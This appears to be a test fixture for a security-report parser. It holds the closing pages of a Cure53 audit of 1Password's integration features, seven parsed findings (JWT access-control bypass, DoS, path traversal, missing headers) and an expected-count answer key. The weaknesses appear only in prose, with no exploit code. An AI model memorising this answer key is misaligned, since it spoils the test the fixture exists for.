Berlin · 07/29/21 15/20\n\n-- 15 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nOverall, missing Cross-Origin security headers can be considered a bad practice that\nshould be avoided in times where attacks such as Spectre are known to be well-\nexploitable and exploit code is publicly available. It is recommended to add the\naforementioned headers to every relevant server response. Resources explaining those\nheaders are available online, explaining both the proper header setup as well as the\npossible consequences of not setting them after all.\nNote: Before this report was released, these headers did not yet have broad browser\nsupport but the 1Password team is looking to implement these as implementations are\npicking up speed.\nConclusions\nAs indicated in the Introduction, the 1Password team can be quite content with the\nresults of this May-June 2021 project. Especially through a longitudinal lens, enabled by\nthe fact that the Cure53 periodically investigates the 1Password B5 web application, it is\nvisible that progress has been made in relation to security. Four members of the Cure53\ntesting team who have strongly focused on several selected, updated or even newly\nadded and implemented features of the 1Password B5 complex, were only able to spot\nseven security-relevant items. None of the spotted flaws exceeded the Medium rating,\nfurther testifying to the acquired strength of the security posture.\nIn this audit, a next iteration of the 1Password B5 application with a special focus on the\nnewly introduced integration features was examined by Cure53. The areas Cure53\nfocused in this audit offer clients the possibility to integrate user and password\nmanagement more easily into their own business processes. Therefore Cure53\nexamined the 1Password CLI, the SCIM bridge, the Connect server of secrets\nautomation and the corresponding B5 application parts related to the integration\nfeatures. Attention was given to the SCIM bridge component, which acts as a separate\nserver between the 1Password backend and an external IDP. Therefore, the running\nconfiguration, the implemented client-side elements and the exposed API endpoints\nwere checked in-depth. Only one issue could be spotted in this area, which allows\nadversaries to perform Denial-of-Service attacks on Groups-routes (see 1PW-14-002).\nDue to the fact that the main purpose of the SCIM bridge is to de-provision users and\ngroups, a special focus was also placed on checking if the implemented features are\nstrong enough to protect against attacks such as account-takeovers and privilege\nescalations. For example, the endpoints allow an IDP to change an email of an account,\nwhich generally weakens account-security. However, 1Password forces the new user to\nconfirm the new email address with the master password and secret key, which\nultimately prevents such types of attacks in general. Moreover, it was checked if a full\nCure53, Berlin · 07/29/21 16/20\n\n-- 16 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nDoS of the 1Password account could be possible via suspending all users, inclusive of\naccount Owners. Luckily, an implemented check protects suspending the last owner of\nan account, thereby preventing a full lockout.\nGeneral access to the endpoints on the SCIM bridge is handled via the bearer token.\nThis means that any user who has access to the token can typically (de)provision users\nand groups. Also, if users only have access to Okta, the bearer token can be obtained\nvia pointing the health check to one’s own server, which has the token embedded in the\nrequest header. In the end, it all depends on the awareness of the company to follow the\nprinciple of minimalism, i.e. by only providing the token to trusted users. The current\ndesign could withstand many different attacks, which is a solid result.\nConsiderable and in-depth testing was invested into uncovering sensitive information\nleaks via the corresponding API endpoints provided by the 1Password B5 application.\nWith the focus on typical application problems, the issues connected with various types\nof injection attacks, which could compromise the server part of the application, were\ninvestigated without significant success. The testers did not reveal any grave issues\nlinked to the ACL, despite intensive and dedicated searches for pathways that can be\ncompromised. The Cure53 team noted that endpoints clearly determine user-input and\nverify whether certain actions are available for the user prior to the final acceptance of\nsuch input. As a result, no serious ACL or IDOR problem could be found that might allow\nattackers to obtain or modify sensitive data related to other user accounts.\nAdditionally, the API endpoints provided by the Connect server for the Secrets\nautomation feature were also examined in terms of ACL problems. Cure53 wanted to\nfind out whether they leak any kind of sensitive information or are prone to various types\nof injection attacks, which might allow attackers to access or modify other users' data or\ncompromise the server. It was confirmed that the API endpoints have proper access\ncontrol checks in place. Furthermore, a solid input validation was implemented, which\nclearly underlines the praiseworthy impression made by this area. No serious issue\ncould be spotted in connection to compromising other users’ accounts or accessing\nsensitive data.\nOne of the priorities set for this 1Password test with a special focus on integration\nfeatures concerned classic web vulnerabilities, potential logic flaws, and parsing issues.\nCure53 investigated the client-side code and the web application’s functionality of the\nrelated B5 application parts, the SCIM bridge and the Connect server for the presence of\nXSS attacks and similar input-manipulation issues. Compared to the last audit of the B5\napplication, in this round no issues of this nature were detected. This results mainly from\nthe correct usage of the React framework that offers a high security standard in this field.\nCure53, Berlin · 07/29/21 17/20\n\n-- 17 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nThe tested application generally makes a stable impression in terms of client-side\ninjections, which is a very positive indication rarely found during audits of this nature.\nThe newly introduced Connect server for running the Secrets automation service and the\nSCIM bridge server are missing some of the important security headers. In order to\nfurther harden those applications against client-side related attacks, it is recommended\nto configure the aforementioned headers with the proposed values (see 1PW-14-001).\nEven if some headers seem to be not necessary yet, they can mitigate many different\nattacks in future releases which might be shipped with more features. Cure53\nrecommends to also consider the use of some of the newer Cross-Origin-related security\nheaders on the 1Password servers. This would help the complex benefit from some\nadvanced protections and harden access from Cross-Origins to 1Password-related\nresources (see 1PW-14-007).\nThe 1Password CLI application was examined by Cure53 regarding input validation,\noutput-encoding and the handling of sensitive data on system level. One finding is\nconnected to an incomplete check of the URL parameter used within the sign-in\nfunctionality of the 1Password CLI application. In combination with the supported GZIP\ncompression in the Golang HTTP client, which is activated by default, an attacker is able\nto send GZIP bombs back to the client. Those can result in Denial-of-Service attacks on\nclient’s systems (see 1PW-14-006). However, the attack is limited regarding exploitability\ndue to the fact that an attacker has to use some social engineering approaches to\nsucceed. Nevertheless, it is recommended to mitigate this type of attack and to introduce\na proper input validation in order to protect user’s systems against malicious content\nreceived from external servers.\nAll components were tested for potential HTTP path traversal injections. Despite\nextensive testing only the CLI email validation was discovered to be exploitable to\nmodify the HTTP path as described in 1PW-14-005. Additionally, the storage of local\nsecrets as well as the permission of the local unix socket were assessed. The\n1Password CLI correctly sets permissions for utilized files or directories as well as\nverifies if an existing directory is a symlink or has the correct owner before storing any\ninformation.\nMoving on to the 1Password Secret automation feature. As the Connect server has to be\ninstalled in local company networks, the security posture of the exposed configuration\nand endpoints of the server have been examined. The communication between the SDK\nand the local connect server is conducted via HTTP. This could be further hardened by\nusing some sort of an encrypted transport layer, mitigating against potential local\nattackers, since eavesdropping on the traffic and obtaining valid service account\nauthentication credentials are remaining risks. The review of the related sources shows\nCure53, Berlin · 07/29/21 18/20\n\n-- 18 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nthat the application is able to communicate via HTTPS. Nevertheless, it is recommended\nto support customers accordingly with tailored techniques, so that the server is not\ndeployed with HTTP by default.\nThe Docker setup and its local discovery has been audited against potential local\nattackers, evaluating possibilities of websocket hijacking. Those are marginal due to\nrequiring a rogue Docker container or another service that listens on the same interface.\nThe general input validation was found to be solid. Processing of inputs, for example in\nqueries to a locally deployed database, has been found to be secure. Classical web\napplication issues were excluded in this area. The authentication and authorization of\nthe Connect server was tested in depth, as it does not only require to verify a client-side\nJWT token but a service JWT token as well.\nAlthough it was possible to modify the client-side JWT token, all attacks were caught by\nthe B5 backend during the creation of a manipulated service token, therefore prohibiting\na malicious admin from accessing any vault. The Connect server component also\ncorrectly verifies if the sent user JWT bearer token matches the associated service token\nand its permission. This was another positive observation.\nThe handling of requests which are being sent to the upstream B5 server was found to\nbe secure and no header injections or similar means have been found to alter or inject\ninto these items. Next to that, the Events streaming feature was also examined by\nCure53 in-depth. As the feature solely relies on the JWT bearer token sent by the users,\nthe parsing was checked for common flaws. The algorithm is hardcoded and cannot be\ninfluenced by the user, for example via the none algorithm. Additionally returned error\nresponses are static and not prone to abuse for leaking additional information of the\nserver-side state, especially as the JWT signature is properly verified.\nAs the event server’s endpoints also accept user-controlled JSON structures, the logic\nwas assessed for potential issues. Although certain limitations were deployed, an issue\nwas discovered as Golang-specific binary structure was accepted, as documented in\n1PW-14-004. No other issues were discovered in this field. The creation of the JWT\ntoken was examined, as this item is utilized to authenticate against the events service. It\nwas found that the JWT structure is solely signed on the client side and it was possible\nto access other company accounts as documented in 1PW-14-003. This issue was\nquickly addressed by the 1Password security team during the testing phase. It must be\nnoted that although allowing the client-side to sign a valid JWT structure introduces a\npotentially huge attack surface, the current 1Password design allowed it to tackle and fix\nthe discovered problem quite quickly.\nCure53, Berlin · 07/29/21 19/20\n\n-- 19 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nLastly, during the review of the provided sources, it was found that 1Password\ndevelopers make use of the static security scanner gosec. This is a very good approach\nand should be continued to keep up a healthy and clean codebase. Performing static\ncode analysis underlines the solid picture Cure53 got during the audit. All in all, the\nexamined 1Password B5 applications and the related, specifically listed newly\nimplemented integration features, should be considered as solid from a security\nperspective. Cure53 more broadly confirmed during this audit that the provided\napplications and builds have the capacity to fend off many different attacks. This clearly\nshows that the 1Password team is aware of problems that web applications and also\nlocal clients tend to face.\nAs a result, typically the flaws’ implications stood only at Medium and Low, thereby\nindicating that stable protections are in place. In light of this being the first in-depth\nexamination of the integration features, Cure53 sees this as an excellent outcome.\nEspecially the very meticulously implemented access-control checks in combination with\nproperly implemented cryptographic protections and the correct usage of good\nframeworks and languages, such as Go, significantly raises the bar for attackers. Once\nthe relevant issues are fixed, Cure53 can be even more confident that the newly\nintroduced integration features have been correctly secured for production use and are\ncapable of delivering a secure foundation.\nCure53 would like to thank Rick van Galen, Chris Meek, Connor Hicks, Graham Brown\nand David Gunter from the 1Password team for their excellent project coordination,\nsupport and assistance, both before and during this assignment.\nCure53, Berlin · 07/29/21 20/20\n\n-- 20 of 20 --",
+    "sourceFileName": "Cure53-B5_automations_1PW-14-report.pdf",
+    "createdAtIso": "2026-06-05T23:33:49.751Z",
+    "updatedAtIso": "2026-06-05T23:33:49.751Z"
+  },
+  "findings": [
+    {
+      "id": "F-cure53-001",
+      "slug": "dos-on-scim-bridge-via-groups-route-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "DoS on SCIM bridge via Groups route",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "DoS on SCIM bridge via Groups route affecting investigation-scope; extractor found type Denial of Service.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-002",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.735Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "DoS on SCIM bridge via Groups route",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "DoS on SCIM bridge via Groups route affecting investigation-scope; extractor found type Denial of Service.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-002",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "dos on scim bridge via groups route",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-002|dos on scim bridge via groups route|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "DoS on SCIM bridge via Groups route",
+        "sourceText": "1PW-14-002 WP2: DoS on SCIM bridge via Groups route (Low)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "DoS on SCIM bridge via Groups route",
+      "canonicalKey": "1PW-14-002|dos on scim bridge via groups route|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-002",
+      "slug": "acl-bypass-of-events-via-jwt-token-manipulation-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "ACL bypass of Events via JWT token manipulation",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "ACL bypass of Events via JWT token manipulation affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-003",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.735Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "ACL bypass of Events via JWT token manipulation",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "ACL bypass of Events via JWT token manipulation affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-003",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "acl bypass of events via jwt token manipulation",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-003|acl bypass of events via jwt token manipulation|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "ACL bypass of Events via JWT token manipulation",
+        "sourceText": "1PW-14-003 WP2: ACL bypass of Events via JWT token manipulation (Medium)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "ACL bypass of Events via JWT token manipulation",
+      "canonicalKey": "1PW-14-003|acl bypass of events via jwt token manipulation|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-003",
+      "slug": "client-side-dos-via-missing-sign-in-url-validation-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "Client-side DoS via missing sign-in URL validation",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "Client-side DoS via missing sign-in URL validation affecting investigation-scope; extractor found type Denial of Service.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-006",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.735Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Client-side DoS via missing sign-in URL validation",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Client-side DoS via missing sign-in URL validation affecting investigation-scope; extractor found type Denial of Service.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-006",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "client-side dos via missing sign-in url validation",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-006|client side dos via missing sign in url validation|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Client-side DoS via missing sign-in URL validation",
+        "sourceText": "1PW-14-006 WP1: Client-side DoS via missing sign-in URL validation (Low)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Client-side DoS via missing sign-in URL validation",
+      "canonicalKey": "1PW-14-006|client side dos via missing sign in url validation|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-004",
+      "slug": "general-http-security-headers-missing-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "General HTTP security headers missing",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "General HTTP security headers missing affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-001",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.735Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "General HTTP security headers missing",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "General HTTP security headers missing affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-001",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "general http security headers missing",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-001|general http security headers missing|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "General HTTP security headers missing",
+        "sourceText": "1PW-14-001 WP1: General HTTP security headers missing (Medium)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "General HTTP security headers missing",
+      "canonicalKey": "1PW-14-001|general http security headers missing|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-005",
+      "slug": "security-of-events-endpoint-weakened-by-gob-parsing-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "Security of events endpoint weakened by gob parsing",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "Security of events endpoint weakened by gob parsing affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-004",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.736Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Security of events endpoint weakened by gob parsing",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Security of events endpoint weakened by gob parsing affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-004",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "security of events endpoint weakened by gob parsing",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-004|security of events endpoint weakened by gob parsing|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Security of events endpoint weakened by gob parsing",
+        "sourceText": "1PW-14-004 WP2: Security of events endpoint weakened by gob parsing (Info)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Security of events endpoint weakened by gob parsing",
+      "canonicalKey": "1PW-14-004|security of events endpoint weakened by gob parsing|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-006",
+      "slug": "http-path-traversal-in-cli-login-implementation-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "HTTP path traversal in CLI login implementation",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "HTTP path traversal in CLI login implementation affecting investigation-scope; extractor found type Path Traversal.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-005",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.736Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "HTTP path traversal in CLI login implementation",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "HTTP path traversal in CLI login implementation affecting investigation-scope; extractor found type Path Traversal.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-005",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "http path traversal in cli login implementation",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-005|http path traversal in cli login implementation|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "HTTP path traversal in CLI login implementation",
+        "sourceText": "1PW-14-005 WP2: HTTP path traversal in CLI login implementation (Info)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "HTTP path traversal in CLI login implementation",
+      "canonicalKey": "1PW-14-005|http path traversal in cli login implementation|investigation scope||||||"
+    },
+    {
+      "id": "F-cure53-007",
+      "slug": "cross-origin-related-http-security-headers-missing-investigation-scope",
+      "reportId": "G-cure53-b5-automations-1pw-14-report",
+      "reportName": "cure53-b5-automations-1pw-14-report",
+      "title": "Cross-Origin-related HTTP security headers missing",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:33:43.152Z",
+      "summary": "Cross-Origin-related HTTP security headers missing affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: 1PW-14-007",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:33:49.736Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Cross-Origin-related HTTP security headers missing",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Cross-Origin-related HTTP security headers missing affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: 1PW-14-007",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "cross-origin-related http security headers missing",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "1PW-14-007|cross origin related http security headers missing|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Cross-Origin-related HTTP security headers missing",
+        "sourceText": "1PW-14-007 WP1: Cross-Origin-related HTTP security headers missing (Info)",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Cross-Origin-related HTTP security headers missing",
+      "canonicalKey": "1PW-14-007|cross origin related http security headers missing|investigation scope||||||"
+    }
+  ],
+  "eval": {
+    "enableNlp": true,
+    "expectedCount": 7,
+    "actualCount": 7,
+    "expectedSeverityCounts": {
+      "Critical": 0,
+      "High": 0,
+      "Medium": 2,
+      "Low": 5
+    },
+    "actualSeverityCounts": {
+      "Critical": 0,
+      "High": 0,
+      "Medium": 2,
+      "Low": 5
+    },
+    "duplicates": 0,
+    "negativeHits": 0,
+    "pass": true
+  }
+}
